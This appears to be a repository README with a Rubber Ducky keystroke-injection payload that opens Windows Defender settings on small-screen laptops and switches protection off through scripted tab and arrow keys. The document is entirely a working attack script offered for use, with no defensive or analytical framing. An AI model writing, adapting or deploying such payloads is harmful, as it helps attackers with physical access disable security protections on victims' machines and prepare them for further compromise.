# Rubber-Ducky-Script-Disable-Windows-Defender-on-Eee-Pc

A simple Script for Rubber Ducky to disable windows defender on small screen laptops


Payload:


DELAY 1000
CONTROL ESCAPE
DELAY 1000
STRING windows defender settings
DELAY 1000
ENTER
REM here start the windows defender menù
DELAY 1000
TAB
DELAY 1000
DOWNARROW
DELAY 1000
TAB
DELAY 1000
DOWNARROW
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
DOWNARROW
REM close the menu
DELAY 1000
ALT F4


